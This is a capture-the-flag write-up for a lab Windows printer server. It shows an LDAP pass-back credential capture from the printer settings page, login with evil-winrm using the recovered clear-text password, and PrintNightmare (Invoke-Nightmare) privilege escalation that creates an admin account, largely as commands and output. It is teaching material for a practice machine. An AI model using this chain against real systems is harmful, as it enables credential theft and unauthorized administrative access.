## Objectives
- User Own
- System Own

<br>

## Initial Enumeration

### Nmap Scan

`sudo nmap -sC -sV -A -T4 10.10.11.108`

```

### Gobuster Scan

`gobuster dir -u http://10.10.11.108 -t 100 -r -x php,txt,html -w dir-med.txt`

```
/images               (Status: 403) [Size: 1233]

/settings.php         (Status: 200) [Size: 29090]
```

## Website Digging

According to **Wappalyzer** this website is running on IIS version 10.0 and has a PHP backend.

Visiting the webpage takes us to a printer admin panel.

<br>

Clicking on the **Settings** tab takes us to:

![](images/return2.png)

<br>

The **Fax** and **Troubleshooting** links don't actually lead anywhere.

The page source code doesn't show anything useful.

There are no cookies set.

I test for **SQLi** with **sqlmap** and don't find anything.

I decide to see if I can get the printer to connect back to me since I'm able to enter the IP address for it. I start a listener on my system using port 389 and then add my IP to the server address and click update.

```
connect to [<MY IP>] from (UNKNOWN) [10.10.11.108] 52374
0*`%return\svc-printerï¿½
                       1edFg43012!!
```

It works, and that certainly looks to me like it's a clear text password for user **svc-printer**.

<br>

## SMB Digging

I first do a list with no login and it doesn't show anything. I then try to use the **svc-printer** id since it's the only thing we have at the moment and it does have some available shares:

`smbclient -L 10.10.11.108 -U svc-printer`

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share
```

Looking in the **NETLOGON** share doesn't show anything.

Checking out the **SYSVOL** share has the following:

`smbclient \\\\10.10.11.108\\SYSVOL -U svc-printer`

```
smb: \> dir
  .                                   D        0  Thu May 20 09:25:44 2021
  ..                                  D        0  Thu May 20 09:25:44 2021
  return.local                       Dr        0  Thu May 20 09:25:44 2021
```

Instead of digging through the directories on the server I'm just going to **mget** everything down and browse locally.

On the SMB server I use `prompt` and then 'recurse' and then `mget *`:

```
NT_STATUS_ACCESS_DENIED listing \return.local\DfsrPrivate\*

```

I look through the files but don't find anything overly interesting.

<br>

## System Access

Let's see if we can utilize **evil-winrm** here:

`evil-winrm -i 10.10.11.108 -u svc-printer -p '<1edFg43012!!>'`

```
Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

Success! Changing over to the **Desktop** directory shows us the user.txt flag, which we can display:

```
    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/24/2022  12:52 PM             34 user.txt
```

Given we have a printer exposed to the internet I check to see if it's vulnerable to **PrintNightmare**:

`./printnightmare.py -check 'svc-printer:1edFg43012!!@10.10.11.108'`

```
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[*] Target appears to be vulnerable!
```

Looks like it is and we should be able to escalate privileges using it. You can download the [**PowerShell script**](https://github.com/calebstewart/CVE-2021-1675) from this repository created by Caleb Stewart and John Hammond over to your local machine.

Then, change over to this directory on the target machine: `cd C:\windows\system32\spool\drivers\color`

Upload the PowerShell script using the `upload <filename>` command.

Once it's there run the following to import the module:

`Import-Module .\CVE-2021-1675.ps1`

Then just run the `Invoke-Nightmare` command and it will create a user for you that has admin privileges.

```
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\svc-printer\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\svc-printer\AppData\Local\Temp\nightmare.dll
```

<br>

## Admin

We now have user **adm1n** with a password of **P@ssw0rd** and it should have admin privileges.

I verify the permissions of the new user `net user adm1n`:

```
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> net user adm1n

User name                    adm1n
Full Name                    adm1n
Comment

User may change password     Yes

Workstations allowed         All
Logon script

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.
```

Ok good to go now we can use **evil-winrm** to connect back over with our new user:

`evil-winrm -i 10.10.11.108 -u adm1n -p P@ssw0rd`

```
vil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\adm1n\Documents>
```

With that we should be able to change to the **Administrator** desktop and get the **root.txt** flag:

```
    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/24/2022  12:52 PM             34 root.txt
```

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt

<br>

And with that we've completed this CTF!

## Conclusion

A quick run down of what we covered in this CTF:

- Basic enumeration using **nmap** and **gobuster**
- Exploiting a printer to connect back to us and display credentials in clear text
- Utilizing **evil-winrm** to get initial access to the system
- Exploiting **PrintNightmare** to escalate privileges to admin
